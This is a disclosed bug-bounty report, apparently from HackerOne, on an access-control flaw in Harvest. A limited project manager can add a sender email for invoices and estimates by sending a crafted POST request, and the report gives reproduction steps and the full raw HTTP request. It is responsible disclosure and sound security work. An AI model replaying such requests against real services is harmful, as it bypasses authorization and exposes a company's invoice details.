@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/158979
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/vijay_kumar1110
+ReportedTo:Harvest(harvest)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:29.09.2016 23:02:59
+
+Summary:
+
+Hi Team,
+
+Description : Project Manager With limited access Invoices and estimates don't have access to Company information. In the company Information there is a option of adding an Email to send invoices and estimations. The limited access Project manager should not be able to Access this sections and shouldn't be able to add the email to send invoices on that.
+But the Adding Email HTTP request have some access control issues.Hence it let's the Project manager (with limited) to Add new email . 
+
+Steps to reproduce : 
+1.Create a New account with Owner(UserA) and add a Project manager(Attacker) where he doesn't have access to invoices and addition features.
+2.Open the Project Manager's account and you will see that he's not able to access the Invoice and estimation section where you can change the company info.
+3.Run the Below Mentioned HTTP request  From any proxy tool : 
+
+POST /sender_emails HTTP/1.1
+Host: vijaygangani.harvestapp.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/javascript, text/html, application/xml, text/xml, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+X-Prototype-Version: 1.7
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://vijaygangani.harvestapp.com/invoices/configure
+Content-Length: 287
+Cookie: [Cookie_values]
+Connection: keep-alive
+
+utf8=%E2%9C%93&url_hash=thank_you_email&sender_email%5Bname%5D=[Sender's Name]&sender_email%5Bemail%5D=[Email]&authenticity_token=[Token_Value]&x_requested_with=XMLHttpRequest
+
+4.After sending  this Request to server ,It won't check the access and The verification email will be sent to your mentioned email in the HTTP request. 
+5. Now Attacker can go to the email and add his email by verifying the email.
+
+Note : The above Mentioned HTTP request can be get by below mentioned link and add email :  https://vijaygangani.harvestapp.com/invoices/configure#company_information_edit
+
+
+Impact :  Any Project Manager with limited access can add his own email to get All the estimation and invoice Details.
+
+Let me know if you need Video POC or any other information regarding this issue.
+
+Best Regards !
+Vijay Kumar 
+
